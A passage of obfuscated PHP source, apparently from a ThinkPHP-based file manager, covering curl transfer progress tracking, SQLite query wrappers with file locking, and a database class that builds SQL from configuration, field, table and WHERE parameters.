intval($a³ïÇï³‡[$bÙ¥”‹ˆ[360]] * 0.4); break; } $this->update($CõšòØíÎ); $this->sourceModelCopyFlag = !1; goto dÏ¡©„¿š; dÏ¡©„¿š: } public function sourceRemove($AóµŸ³ƒÎó, $a½…÷ÈÉ†) { $e¯”Û·©öâ =& $_SERVER[ì‹É]; $this->sourceModelCopyFlag = !0; $CèÙÉ×Á­ = 1; if (isset($AóµŸ³ƒÎó[$e¯”Û·©öâ[81]])) { $CèÙÉ×Á­ = $AóµŸ³ƒÎó[$e¯”Û·©öâ[81]][$e¯”Û·©öâ[79]] + $AóµŸ³ƒÎó[$e¯”Û·©öâ[81]][$e¯”Û·©öâ[80]] + 1; } $this->update($CèÙÉ×Á­); $this->sourceModelCopyFlag = !1; } public function sourceMove($A½ÉåÔÊçÙ) { $this->sourceRemove($A½ÉåÔÊçÙ, !1); } public function curlProgress($F‡ç‚î–Ğ, $A›ÔÍÌ­„, $d¨Òù˜¾¹, $C‘Â‹ˆ¡ˆé, $Eª•¬è¢Õ¾) { $aßÏÉòò =& $_SERVER[ì‹É]; $eğ”³Ù ÌŸ =& $this->task; if ($Eª•¬è¢Õ¾ > 0) { $eğ”³Ù ÌŸ[$aßÏÉòò[1296]] = $aßÏÉòò[1408]; $eğ”³Ù ÌŸ[$aßÏÉòò[1398]] = $aßÏÉòò[92]; if ($eğ”³Ù ÌŸ[$aßÏÉòò[1396]] == $C‘Â‹ˆ¡ˆé || $C‘Â‹ˆ¡ˆé > 1024 * 1024) { $eğ”³Ù ÌŸ[$aßÏÉòò[1397]] = $Eª•¬è¢Õ¾; } if ($eğ”³Ù ÌŸ[$aßÏÉòò[1399]]) { $eğ”³Ù ÌŸ[$aßÏÉòò[1397]] = $Eª•¬è¢Õ¾ + $eğ”³Ù ÌŸ[$aßÏÉòò[1399]]; } } else { if ($d¨Òù˜¾¹ > 0) { if ($eğ”³Ù ÌŸ[$aßÏÉòò[1396]] == $A›ÔÍÌ­„) { $eğ”³Ù ÌŸ[$aßÏÉòò[1397]] = $d¨Òù˜¾¹; $eğ”³Ù ÌŸ[$aßÏÉòò[1296]] = $aßÏÉòò[1409]; $eğ”³Ù ÌŸ[$aßÏÉòò[1398]] = $aßÏÉòò[1014]; } } } $this->update(); } public function curlProgressStart($céù¢­ÌØß) { } public function curlProgressEnd($DèÈÆ»êå÷) { $fß™ç®èçÑ =& $_SERVER[ì‹É]; $e‘¾äô¨ =& $this->task; $B˜„âÔí¹ = curl_getinfo($DèÈÆ»êå÷); $Dé‘×–ë™ = $B˜„âÔí¹[$fß™ç®èçÑ[1410]]; if ($e‘¾äô¨[$fß™ç®èçÑ[1398]] == $fß™ç®èçÑ[92] && $Dé‘×–ë™) { $e‘¾äô¨[$fß™ç®èçÑ[1399]] += $Dé‘×–ë™; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $b°ˆŠ°‡Ç =& $_SERVER[ì‹É]; Hook::bind($b°ˆŠ°‡Ç[1388], array($this, $b°ˆŠ°‡Ç[1411])); Hook::bind($b°ˆŠ°‡Ç[1390], array($this, $b°ˆŠ°‡Ç[1412])); Hook::bind($b°ˆŠ°‡Ç[1392], array($this, $b°ˆŠ°‡Ç[1413])); } protected function endAfter() { $dèÏñâºê =& $_SERVER[ì‹É]; Hook::unbind($dèÏñâºê[1388], array($this, $dèÏñâºê[1411])); Hook::unbind($dèÏñâºê[1390], array($this, $dèÏñâºê[1412])); Hook::unbind($dèÏñâºê[1392], array($this, $dèÏñâºê[1413])); } public function progressStart($fÅƒ¢Å¿ø²) { $d©’ŒËÉåÄ =& $_SERVER[ì‹É]; $EÕÓÒ©¸©æ = curl_getinfo($fÅƒ¢Å¿ø²); self::log($d©’ŒËÉåÄ[1414] . $EÕÓÒ©¸©æ[$d©’ŒËÉåÄ[292]]); self::valueSet($this->task[$d©’ŒËÉåÄ[364]], $this->task); } public function progressEnd($B‘Ï’ì†ô) { $F·‹ù‡Üí =& $_SERVER[ì‹É]; self::log($F·‹ù‡Üí[1415] . $this->task[$F·‹ù‡Üí[364]]); $this->end(); } public function progress($c¾æ­Ş¿Œ, $aÂ‰ÍôÃî§, $D—³”µ¡ƒ³, $fï‚Î¡“Š×, $a‹–… ùóã) { $DÊî²Õ„”ƒ =& $_SERVER[ì‹É]; $c¥Ùœ „Ş =& $this->task; if ($a‹–… ùóã > 0) { $c¥Ùœ „Ş[$DÊî²Õ„”ƒ[1294]] = $c¥Ùœ „Ş[$DÊî²Õ„”ƒ[1294]] == 0 ? $fï‚Î¡“Š× : $c¥Ùœ „Ş[$DÊî²Õ„”ƒ[1294]]; $c¥Ùœ „Ş[$DÊî²Õ„”ƒ[1299]] = $a‹–… ùóã; } else { if ($D—³”µ¡ƒ³ > 0) { $c¥Ùœ „Ş[$DÊî²Õ„”ƒ[1294]] = $c¥Ùœ „Ş[$DÊî²Õ„”ƒ[1294]] == 0 ? $aÂ‰ÍôÃî§ : $c¥Ùœ „Ş[$DÊî²Õ„”ƒ[1294]]; $c¥Ùœ „Ş[$DÊî²Õ„”ƒ[1299]] = $D—³”µ¡ƒ³; } } $this->update(); self::log("\160\x72\x6f\x67\x72\145\x73\x73\x48\164\164\x70\x3a\144\157\167\156\72{$D—³”µ¡ƒ³}\x2f{$aÂ‰ÍôÃî§}\x3b\40\x75\160\x6c\x6f\141\144\x3a{$a‹–… ùóã}\x2f{$fï‚Î¡“Š×}\73"); } } goto A½â–¡’ã; FöÎ«™°Œè: class DbSqlite extends DbSqliteBase { public function query($F¦Ê­Ëë¯) { goto eè–¿Ã‡²; eè–¿Ã‡²: $D²–¿¤Ëòê =& $_SERVER[ì‹É]; $CªéŞ¬¥¡Ø = DATA_PATH . $D²–¿¤Ëòê[869]; $BÈˆößƒê‰ = fopen($CªéŞ¬¥¡Ø, $D²–¿¤Ëòê[870]); goto D¢ˆ³íº¬¼; D¢ˆ³íº¬¼: if (!$BÈˆößƒê‰) { return !1; } if (flock($BÈˆößƒê‰, LOCK_EX)) { $Cä¬Ÿ‘îÆ™ = parent::query($F¦Ê­Ëë¯); flock($BÈˆößƒê‰, LOCK_UN); fclose($BÈˆößƒê‰); return $Cä¬Ÿ‘îÆ™; } flock($BÈˆößƒê‰, LOCK_UN); goto aÛö–¨èƒõ; aÛö–¨èƒõ: fclose($BÈˆößƒê‰); show_json($D²–¿¤Ëòê[871], !1); return !1; goto bÈ”›Ã¼ÊÇ; bÈ”›Ã¼ÊÇ: } public function execute($bÕˆã“ù·°) { goto D…­‡³Öà; D…­‡³Öà: $bœ‚§ë¤ =& $_SERVER[ì‹É]; $f’Ë¯¸¼·ª = DATA_PATH . $bœ‚§ë¤[869]; $F¢ÍÏÎÚêÎ = fopen($f’Ë¯¸¼·ª, $bœ‚§ë¤[870]); goto bàŞµ÷ƒ¾ô; bàŞµ÷ƒ¾ô: if (!$F¢ÍÏÎÚêÎ) { return !1; } if (flock($F¢ÍÏÎÚêÎ, LOCK_EX)) { $dÖí¡±Ç–© = parent::execute($bÕˆã“ù·°); flock($F¢ÍÏÎÚêÎ, LOCK_UN); fclose($F¢ÍÏÎÚêÎ); return $dÖí¡±Ç–©; } flock($F¢ÍÏÎÚêÎ, LOCK_UN); goto dÁÛÂğ‚È‰; dÁÛÂğ‚È‰: fclose($F¢ÍÏÎÚêÎ); show_json($bœ‚§ë¤[871], !1); return !1; goto EÙ¥œÑ—…Ó; EÙ¥œÑ—…Ó: } } class DbSqlite3 extends DbSqlite3Base { public function query($aõµÄ‘ Û) { goto CëŸÊõÒæ; D˜ƒ­Úˆ®: fclose($Aä•µÂ¬§õ); show_json($dóù¶šô‹ò[871], !1); return !1; goto b°‰¬ƒÈæÙ; CëŸÊõÒæ: $dóù¶šô‹ò =& $_SERVER[ì‹É]; $A»äğá”ŞÄ = DATA_PATH . $dóù¶šô‹ò[869]; $Aä•µÂ¬§õ = fopen($A»äğá”ŞÄ, $dóù¶šô‹ò[870]); goto Aœ‰¬ö»Š; Aœ‰¬ö»Š: if (!$Aä•µÂ¬§õ) { return !1; } if (flock($Aä•µÂ¬§õ, LOCK_EX)) { $Cˆç¡–Ì²ç = parent::query($aõµÄ‘ Û); flock($Aä•µÂ¬§õ, LOCK_UN); fclose($Aä•µÂ¬§õ); return $Cˆç¡–Ì²ç; } flock($Aä•µÂ¬§õ, LOCK_UN); goto D˜ƒ­Úˆ®; b°‰¬ƒÈæÙ: } public function execute($f¼•£±—ğÖ) { goto f §´Ø„ÒÄ; eª”«¿¼ø«: fclose($C÷”ã…ÕŠ¬); show_json($Cõ‚Ê¯‹•º[871], !1); return !1; goto fŠÅ¹›–±ô; Aİ§á—¯ : if (!$C÷”ã…ÕŠ¬) { return !1; } if (flock($C÷”ã…ÕŠ¬, LOCK_EX)) { $cõ¿“ÆÒ = parent::execute($f¼•£±—ğÖ); flock($C÷”ã…ÕŠ¬, LOCK_UN); fclose($C÷”ã…ÕŠ¬); return $cõ¿“ÆÒ; } flock($C÷”ã…ÕŠ¬, LOCK_UN); goto eª”«¿¼ø«; f §´Ø„ÒÄ: $Cõ‚Ê¯‹•º =& $_SERVER[ì‹É]; $b¬‘È±î·ë = DATA_PATH . $Cõ‚Ê¯‹•º[869]; $C÷”ã…ÕŠ¬ = fopen($b¬‘È±î·ë, $Cõ‚Ê¯‹•º[870]); goto Aİ§á—¯ ; fŠÅ¹›–±ô: } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\150\x69\x6e\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $exp = array("\145\161" => "\75", "\x6e\x65\161" => "\74\x3e", "\x67\164" => "\76", "\145\x67\x74" => "\x3e\75", "\x6c\164" => "\74", "\145\x6c\164" => "\74\x3d", "\x6e\157\x74\x6c\x69\153\145" => "\116\117\x54\40\114\111\x4b\105", "\154\x69\153\x65" => "\114\x49\113\105", "\151\x6e" => "\x49\116", "\x6e\x6f\x74\x69\156" => "\x4e\117\x54\40\x49\x4e", "\x6e\x6f\x74\40\151\156" => "\116\x4f\x54\40\111\x4e", "\x62\x65\x74\167\145\145\x6e" => "\102\105\124\127\105\x45\116", "\x6e\x6f\x74\x62\x65\164\x77\145\145\x6e" => "\116\117\124\40\x42\x45\124\x57\105\105\x4e", "\x6e\x6f\164\40\142\145\164\x77\145\145\156" => "\x4e\x4f\124\x20\102\x45\124\127\x45\x45\x4e"); protected $selectSql = "\x53\105\x4c\105\x43\x54\x25\x44\111\123\x54\111\116\x43\x54\x25\40\45\106\x49\x45\x4c\x44\x25\x20\x46\x52\117\x4d\x20\45\124\x41\x42\x4c\105\45\45\x4a\117\x49\x4e\45\45\127\x48\x45\x52\105\x25\45\x47\x52\117\x55\120\x25\x25\x48\101\x56\111\116\x47\45\x25\x4f\x52\x44\x45\122\45\45\x4c\111\115\111\124\x25\x20\45\125\116\x49\x4f\x4e\x25\x25\x43\x4f\115\x4d\x45\x4e\x54\x25"; protected $bind = array(); public static function getInstance() { $aã…Õ‰çí“ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[ì‹É][872], $aã…Õ‰çí“); } public function factory($E¯ÌÈ©Õê = '') { goto dñ±šÛÛåØ; F‹ôÎÈ¤Ø: $this->dbType = ucwords(strtolower($E¯ÌÈ©Õê[$eµ”Æ¼Ê—[873]])); $bñ÷Âîß—ï = $eµ”Æ¼Ê—[875] . $this->dbType; if (class_exists($bñ÷Âîß—ï)) { $f‡óĞ›œš = new $bñ÷Âîß—ï($E¯ÌÈ©Õê); if ($eµ”Æ¼Ê—[721] != strtolower($E¯ÌÈ©Õê[$eµ”Æ¼Ê—[873]])) { $f‡óĞ›œš->dbType = strtoupper($this->dbType); } else { $f‡óĞ›œš->dbType = $this->_getDsnType($E¯ÌÈ©Õê[$eµ”Æ¼Ê—[825]]); } } else { think_exception(think_lang($eµ”Æ¼Ê—[876]) . $eµ”Æ¼Ê—[877] . $bñ÷Âîß—ï); } goto C©°º¼µ; C©°º¼µ: return $f‡óĞ›œš; goto f¼¯Ù¼É¡Š; dñ±šÛÛåØ: $eµ”Æ¼Ê— =& $_SERVER[ì‹É]; $E¯ÌÈ©Õê = $this->parseConfig($E¯ÌÈ©Õê); if (empty($E¯ÌÈ©Õê[$eµ”Æ¼Ê—[873]])) { think_exception(think_lang($eµ”Æ¼Ê—[874])); } goto F‹ôÎÈ¤Ø; f¼¯Ù¼É¡Š: } public function __call($DœÁóëğ¦Š, $e¬Ô”éŒÒ•) { if (method_exists($this, $DœÁóëğ¦Š)) { return call_user_func_array(array($this, $DœÁóëğ¦Š), $e¬Ô”éŒÒ•); } } protected function _getDsnType($d¸© ù‡¢š) { $E›¶°ïĞ”” = explode($_SERVER[ì‹É][4], $d¸© ù‡¢š); $aÍêªäËÔ = strtoupper(trim($E›¶°ïĞ””[0])); return $aÍêªäËÔ; } private function parseConfig($Aº±˜×«õÜ = '') { $a÷ä¼ãã» =& $_SERVER[ì‹É]; if (!empty($Aº±˜×«õÜ) && is_string($Aº±˜×«õÜ)) { $Aº±˜×«õÜ = $this->parseDSN($Aº±˜×«õÜ); } elseif (is_array($Aº±˜×«õÜ)) { $Aº±˜×«õÜ = array_change_key_case($Aº±˜×«õÜ); $Aº±˜×«õÜ = array($a÷ä¼ãã»[873] => $Aº±˜×«õÜ[$a÷ä¼ãã»[878]], $a÷ä¼ãã»[797] => $Aº±˜×«õÜ[$a÷ä¼ãã»[879]], $a÷ä¼ãã»[798] => $Aº±˜×«õÜ[$a÷ä¼ãã»[880]], $a÷ä¼ãã»[795] => $Aº±˜×«õÜ[$a÷ä¼ãã»[881]], $a÷ä¼ãã»[796] => $Aº±˜×«õÜ[$a÷ä¼ãã»[882]], $a÷ä¼ãã»[17] => $Aº±˜×«õÜ[$a÷ä¼ãã»[883]], $a÷ä¼ãã»[825] => $Aº±˜×«õÜ[$a÷ä¼ãã»[884]], $a÷ä¼ãã»[13] => $Aº±˜×«õÜ[$a÷ä¼ãã»[885]]); } elseif (empty($Aº±˜×«õÜ)) { if (think_config($a÷ä¼ãã»[723]) && $a÷ä¼ãã»[721] != strtolower(think_config($a÷ä¼ãã»[720]))) { $Aº±˜×«õÜ = $this->parseDSN(think_config($a÷ä¼ãã»[723])); } else { $Aº±˜×«õÜ = array($a÷ä¼ãã»[873] => think_config($a÷ä¼ãã»[720]), $a÷ä¼ãã»[797] => think_config($a÷ä¼ãã»[886]), $a÷ä¼ãã»[798] => think_config($a÷ä¼ãã»[887]), $a÷ä¼ãã»[795] => think_config($a÷ä¼ãã»[888]), $a÷ä¼ãã»[796] => think_config($a÷ä¼ãã»[889]), $a÷ä¼ãã»[17] => think_config($a÷ä¼ãã»[231]), $a÷ä¼ãã»[825] => think_config($a÷ä¼ãã»[723]), $a÷ä¼ãã»[13] => think_config($a÷ä¼ãã»[890])); } } return $Aº±˜×«õÜ; } protected function initConnect($E„Ñ¿ç¹“ó = true) { if (1 == think_config($_SERVER[ì‹É][18])) { $this->_linkID = $this->multiConnect($E„Ñ¿ç¹“ó); } else { if (!$this->connected) { $this->_linkID = $this->connect(); } } } protected function multiConnect($Cé‰ŠÉ»±ˆ = false) { $CÕÂÁÒ„§· =& $_SERVER[ì‹É]; static $bƒ¶Æ¨™ = array(); if (empty($bƒ¶Æ¨™)) { foreach ($this->config as $dçÔƒÈà¼× => $cœæ‚÷¡Ëå) { $bƒ¶Æ¨™[$dçÔƒÈà¼×] = explode($CÕÂÁÒ„§·[47], $cœæ‚÷¡Ëå); } } if (think_config($CÕÂÁÒ„§·[891])) { if ($Cé‰ŠÉ»±ˆ) { $aòîìô£¢ = floor(mt_rand(0, think_config($CÕÂÁÒ„§·[892]) - 1)); } else { if (is_numeric(think_config($CÕÂÁÒ„§·[893]))) { $aòîìô£¢ = think_config($CÕÂÁÒ„§·[893]); } else { $aòîìô£¢ = floor(mt_rand(think_config($CÕÂÁÒ„§·[892]), count($bƒ¶Æ¨™[$CÕÂÁÒ„§·[795]]) - 1)); } } } else { $aòîìô£¢ = floor(mt_rand(0, count($bƒ¶Æ¨™[$CÕÂÁÒ„§·[795]]) - 1)); } $bÁ¹¤Ûó³À = array($CÕÂÁÒ„§·[797] => isset($bƒ¶Æ¨™[$CÕÂÁÒ„§·[797]][$aòîìô£¢]) ? $bƒ¶Æ¨™[$CÕÂÁÒ„§·[797]][$aòîìô£¢] : $bƒ¶Æ¨™[$CÕÂÁÒ„§·[797]][0], $CÕÂÁÒ„§·[798] => isset($bƒ¶Æ¨™[$CÕÂÁÒ„§·[798]][$aòîìô£¢]) ? $bƒ¶Æ¨™[$CÕÂÁÒ„§·[798]][$aòîìô£¢] : $bƒ¶Æ¨™[$CÕÂÁÒ„§·[798]][0], $CÕÂÁÒ„§·[795] => isset($bƒ¶Æ¨™[$CÕÂÁÒ„§·[795]][$aòîìô£¢]) ? $bƒ¶Æ¨™[$CÕÂÁÒ„§·[795]][$aòîìô£¢] : $bƒ¶Æ¨™[$CÕÂÁÒ„§·[795]][0], $CÕÂÁÒ„§·[796] => isset($bƒ¶Æ¨™[$CÕÂÁÒ„§·[796]][$aòîìô£¢]) ? $bƒ¶Æ¨™[$CÕÂÁÒ„§·[796]][$aòîìô£¢] : $bƒ¶Æ¨™[$CÕÂÁÒ„§·[796]][0], $CÕÂÁÒ„§·[17] => isset($bƒ¶Æ¨™[$CÕÂÁÒ„§·[17]][$aòîìô£¢]) ? $bƒ¶Æ¨™[$CÕÂÁÒ„§·[17]][$aòîìô£¢] : $bƒ¶Æ¨™[$CÕÂÁÒ„§·[17]][0], $CÕÂÁÒ„§·[825] => isset($bƒ¶Æ¨™[$CÕÂÁÒ„§·[825]][$aòîìô£¢]) ? $bƒ¶Æ¨™[$CÕÂÁÒ„§·[825]][$aòîìô£¢] : $bƒ¶Æ¨™[$CÕÂÁÒ„§·[825]][0], $CÕÂÁÒ„§·[13] => isset($bƒ¶Æ¨™[$CÕÂÁÒ„§·[13]][$aòîìô£¢]) ? $bƒ¶Æ¨™[$CÕÂÁÒ„§·[13]][$aòîìô£¢] : $bƒ¶Æ¨™[$CÕÂÁÒ„§·[13]][0]); return $this->connect($bÁ¹¤Ûó³À, $aòîìô£¢); } public function parseDSN($Eªãí¸š) { $b‡¨Óµˆ =& $_SERVER[ì‹É]; if (empty($Eªãí¸š)) { return !1; } $a„ºèŞ©ò = parse_url($Eªãí¸š); if ($a„ºèŞ©ò[$b‡¨Óµˆ[165]]) { $D’©Ù±çØ = array($b‡¨Óµˆ[873] => $a„ºèŞ©ò[$b‡¨Óµˆ[165]], $b‡¨Óµˆ[797] => isset($a„ºèŞ©ò[$b‡¨Óµˆ[527]]) ? $a„ºèŞ©ò[$b‡¨Óµˆ[527]] : $b‡¨Óµˆ[33], $b‡¨Óµˆ[798] => isset($a„ºèŞ©ò[$b‡¨Óµˆ[894]]) ? $a„ºèŞ©ò[$b‡¨Óµˆ[894]] : $b‡¨Óµˆ[33], $b‡¨Óµˆ[795] => isset($a„ºèŞ©ò[$b‡¨Óµˆ[166]]) ? $a„ºèŞ©ò[$b‡¨Óµˆ[166]] : $b‡¨Óµˆ[33], $b‡¨Óµˆ[796] => isset($a„ºèŞ©ò[$b‡¨Óµˆ[167]]) ? $a„ºèŞ©ò[$b‡¨Óµˆ[167]] : $b‡¨Óµˆ[33], $b‡¨Óµˆ[17] => isset($a„ºèŞ©ò[$b‡¨Óµˆ[76]]) ? substr($a„ºèŞ©ò[$b‡¨Óµˆ[76]], 1) : $b‡¨Óµˆ[33]); } else { preg_match($b‡¨Óµˆ[895], trim($Eªãí¸š), $BµÁÄğ£´); $D’©Ù±çØ = array($b‡¨Óµˆ[873] => $BµÁÄğ£´[1], $b‡¨Óµˆ[797] => $BµÁÄğ£´[2], $b‡¨Óµˆ[798] => $BµÁÄğ£´[3], $b‡¨Óµˆ[795] => $BµÁÄğ£´[4], $b‡¨Óµˆ[796] => $BµÁÄğ£´[5], $b‡¨Óµˆ[17] => $BµÁÄğ£´[6]); } $D’©Ù±çØ[$b‡¨Óµˆ[825]] = $b‡¨Óµˆ[33]; return $D’©Ù±çØ; } protected function debug() { $a¸ğÖÉ÷©• =& $_SERVER[ì‹É]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $a¸ğÖÉ÷©•[896]; if (think_config($a¸ğÖÉ÷©•[897])) { think_status($a¸ğÖÉ÷©•[898]); think_trace($this->queryStr . $a¸ğÖÉ÷©•[899] . think_status($a¸ğÖÉ÷©•[20], $a¸ğÖÉ÷©•[898], 6) . $a¸ğÖÉ÷©•[900], $a¸ğÖÉ÷©•[33], $a¸ğÖÉ÷©•[901]); } } protected function parseLock($aóØÒ²Ç¹… = false) { $cÖÎ„¯óŠ =& $_SERVER[ì‹É]; if (!$aóØÒ²Ç¹…) { return $cÖÎ„¯óŠ[33]; } if ($cÖÎ„¯óŠ[827] == $this->dbType) { return $cÖÎ„¯óŠ[902]; } return $cÖÎ„¯óŠ[903]; } protected function parseSet($cæÙ™ÎÍ²ë) { $eÏ‘Õğæ¾ô =& $_SERVER[ì‹É]; foreach ($cæÙ™ÎÍ²ë as $dšœùø‰Æ => $DÅÆ„±ÜÃ“) { if (is_array($DÅÆ„±ÜÃ“) && $eÏ‘Õğæ¾ô[282] == $DÅÆ„±ÜÃ“[0]) { $c–‹ëÕÆ¾¬[] = $this->parseKey($dšœùø‰Æ) . $eÏ‘Õğæ¾ô[904] . $DÅÆ„±ÜÃ“[1]; } elseif (is_scalar($DÅÆ„±ÜÃ“) || is_null($DÅÆ„±ÜÃ“)) { $c–‹ëÕÆ¾¬[] = $this->parseKey($dšœùø‰Æ) . $eÏ‘Õğæ¾ô[904] . $this->parseValue($DÅÆ„±ÜÃ“); } } return $eÏ‘Õğæ¾ô[905] . implode($eÏ‘Õğæ¾ô[47], $c–‹ëÕÆ¾¬); } protected function bindParam($C…öĞµè”, $b–”¹–ÏæÓ) { $this->bind[$_SERVER[ì‹É][4] . $C…öĞµè”] = $b–”¹–ÏæÓ; } protected function parseBind($b·¼¹Ãé¦Ë) { $b·¼¹Ãé¦Ë = array_merge($this->bind, $b·¼¹Ãé¦Ë); $this->bind = array(); return $b·¼¹Ãé¦Ë; } function parseKey(&$FÁµØ‚èª, $B²ŒÏ¤õ÷È = true) { if ($B²ŒÏ¤õ÷È) { $FÁµØ‚èª = $this->parseKeyCheck($FÁµØ‚èª); } return $FÁµØ‚èª; } function parseKeyCheck($eĞÒñØ™±Ê) { $BËŠæêù±¼ =& $_SERVER[ì‹É]; $eĞÒñØ™±Ê = trim($eĞÒñØ™±Ê); if (!preg_match($BËŠæêù±¼[906], $eĞÒñØ™±Ê)) { think_exception($BËŠæêù±¼[907] . $eĞÒñØ™±Ê); } return $eĞÒñØ™±Ê; } protected function parseValue($f‹ÄíÙ“‡‹) { $dèî’İ¿³¾ =& $_SERVER[ì‹É]; if (is_string($f‹ÄíÙ“‡‹)) { $f‹ÄíÙ“‡‹ = $dèî’İ¿³¾[866] . $this->escapeString($f‹ÄíÙ“‡‹) . $dèî’İ¿³¾[866]; } elseif (isset($f‹ÄíÙ“‡‹[0]) && is_string($f‹ÄíÙ“‡‹[0]) && strtolower($f‹ÄíÙ“‡‹[0]) == $dèî’İ¿³¾[282]) { $f‹ÄíÙ“‡‹ = $this->escapeString($f‹ÄíÙ“‡‹[1]); } elseif (is_array($f‹ÄíÙ“‡‹)) { $f‹ÄíÙ“‡‹ = array_map(array($this, $dèî’İ¿³¾[867]), $f‹ÄíÙ“‡‹); } elseif (is_bool($f‹ÄíÙ“‡‹)) { $f‹ÄíÙ“‡‹ = $f‹ÄíÙ“‡‹ ? $dèî’İ¿³¾[84] : $dèî’İ¿³¾[464]; } elseif (is_null($f‹ÄíÙ“‡‹)) { $f‹ÄíÙ“‡‹ = $dèî’İ¿³¾[102]; } return $f‹ÄíÙ“‡‹; } protected function parseField($D´âˆÖÌÂº) { $C±ùøñÊ­à =& $_SERVER[ì‹É]; if (is_string($D´âˆÖÌÂº) && strpos($D´âˆÖÌÂº, $C±ùøñÊ­à[47])) { $D´âˆÖÌÂº = explode($C±ùøñÊ­à[47], $D´âˆÖÌÂº); } if (is_array($D´âˆÖÌÂº)) { $d–ÃãğÀ« = array(); foreach ($D´âˆÖÌÂº as $FŠÃÏÊî´‘ => $Aåí‚¬ºŠ¥) { if (!is_numeric($FŠÃÏÊî´‘)) { $d–ÃãğÀ«[] = $this->parseKey($FŠÃÏÊî´‘) . $C±ùøñÊ­à[908] . $this->parseKey($Aåí‚¬ºŠ¥); } else { $d–ÃãğÀ«[] = $this->parseKey($Aåí‚¬ºŠ¥); } } $B–ªôŒ· = implode($C±ùøñÊ­à[47], $d–ÃãğÀ«); } elseif (is_string($D´âˆÖÌÂº) && !empty($D´âˆÖÌÂº)) { $B–ªôŒ· = $D´âˆÖÌÂº; } else { $B–ªôŒ· = $C±ùøñÊ­à[173]; } return $B–ªôŒ·; } protected function parseTable($DëªõÃ«’) { $e½‡—ÑÖõ =& $_SERVER[ì‹É]; if (is_array($DëªõÃ«’)) { $CŸùÆìÜ´Û = array(); foreach ($DëªõÃ«’ as $b˜¨“ìÌ³‚ => $B¦œ¢’É²„) { if (!is_numeric($b˜¨“ìÌ³‚)) { $CŸùÆìÜ´Û[] = $this->parseKey($b˜¨“ìÌ³‚) . $e½‡—ÑÖõ[50] . $this->parseKey($B¦œ¢’É²„); } else { $CŸùÆìÜ´Û[] = $this->parseKey($b˜¨“ìÌ³‚); } } $DëªõÃ«’ = $CŸùÆìÜ´Û; } elseif (is_string($DëªõÃ«’)) { if (strstr($DëªõÃ«’, $e½‡—ÑÖõ[50])) { return $DëªõÃ«’; } $DëªõÃ«’ = explode($e½‡—ÑÖõ[47], $DëªõÃ«’); array_walk($DëªõÃ«’, array($this, $e½‡—ÑÖõ[814])); } return $e½‡—ÑÖõ[909] . trim(implode($e½‡—ÑÖõ[910], $DëªõÃ«’), $e½‡—ÑÖõ[820]) . $e½‡—ÑÖõ[909]; } protected function parseWhere($a šæÃ¡…) { $fÂÖˆ°©Ü© =& $_SERVER[ì‹É]; $Cè›ÔÓòöò = $fÂÖˆ°©Ü©[33]; if (is_string($a šæÃ¡…)) { $Cè›ÔÓòöò = $a šæÃ¡…; } else { $b’İÂ÷– = isset($a šæÃ¡…[$fÂÖˆ°©Ü©[911]]) ? strtoupper($a šæÃ¡…[$fÂÖˆ°©Ü©[911]]) : $fÂÖˆ°©Ü©[33]; if (in_array($b’İÂ÷–, array($fÂÖˆ°©Ü©[912], $fÂÖˆ°©Ü©[913], $fÂÖˆ°©Ü©[914]))) { $b’İÂ÷– = $fÂÖˆ°©Ü©[50] . $b’İÂ÷– . $fÂÖˆ°©Ü©[50]; unset($a šæÃ¡…[$fÂÖˆ°©Ü©[911]]); } else { $b’İÂ÷– = $fÂÖˆ°©Ü©[915]; } foreach ($a šæÃ¡… as $Câù¸ò‡¹é => $Cöµæˆ™»Ô) { $Cè›ÔÓòöò .= $fÂÖˆ°©Ü©[262]; if (is_numeric($Câù¸ò‡¹é)) { $Câù¸ò‡¹é = $fÂÖˆ°©Ü©[916]; } if (0 === strpos($Câù¸ò‡¹é, $fÂÖˆ°©Ü©[71])) { $Cè›ÔÓòöò .= $this->parseThinkWhere($Câù¸ò‡¹é, $Cöµæˆ™»Ô); } else { if (!preg_match($fÂÖˆ°©Ü©[917], trim($Câù¸ò‡¹é))) { think_exception(think_lang($fÂÖˆ°©Ü©[918]) . $fÂÖˆ°©Ü©[4] . $Câù¸ò‡¹é); } $eÑô÷Ì· = is_array($Cöµæˆ™»Ô) && isset($Cöµæˆ™»Ô[$fÂÖˆ°©Ü©[919]]); $Câù¸ò‡¹é = trim($Câù¸ò‡¹é); if (strpos($Câù¸ò‡¹é, $fÂÖˆ°©Ü©[268])) { $CÅæíˆ = explode($fÂÖˆ°©Ü©[268], $Câù¸ò‡¹é); $bÎÊ¬Å—©¸ = array(); foreach ($CÅæíˆ as $E™ö½²Ùøœ => $b¢­‹ÍÊ–æ) { $E¯Ë×–™¨ = $eÑô÷Ì· ? $Cöµæˆ™»Ô[$E™ö½²Ùøœ] : $Cöµæˆ™»Ô; $bÎÊ¬Å—©¸[] = $fÂÖˆ°©Ü©[245] . $this->parseWhereItem($this->parseKey($b¢­‹ÍÊ–æ), $E¯Ë×–™¨) . $fÂÖˆ°©Ü©[813]; } $Cè›ÔÓòöò .= implode($fÂÖˆ°©Ü©[920], $bÎÊ¬Å—©¸); } elseif (strpos($Câù¸ò‡¹é, $fÂÖˆ°©Ü©[269])) { $CÅæíˆ = explode($fÂÖˆ°©Ü©[269], $Câù¸ò‡¹é); $bÎÊ¬Å—©¸ = array(); foreach ($CÅæíˆ as $E™ö½²Ùøœ => $b¢­‹ÍÊ–æ) { $E¯Ë×–™¨ = $eÑô÷Ì· ? $Cöµæˆ™»Ô[$E™ö½²Ùøœ] : $Cöµæˆ™»Ô; $bÎÊ¬Å—©¸[] = $fÂÖˆ°©Ü©[245] . $this->parseWhereItem($this->parseKey($b¢­‹ÍÊ–æ), $E¯Ë×–™¨) . $fÂÖˆ°©Ü©[813]; } $Cè›ÔÓòöò .= implode($fÂÖˆ°©Ü©[915], $bÎÊ¬Å—©¸); } else { $Cè›ÔÓòöò .= $this->parseWhereItem($this->parseKey($Câù¸ò‡¹é), $Cöµæˆ™»Ô); } } $Cè›ÔÓòöò .= $fÂÖˆ°©Ü©[263] . $b’İÂ÷–; } $Cè›ÔÓòöò = substr($Cè›ÔÓòöò, 0, -strlen($b’İÂ÷–)); } return 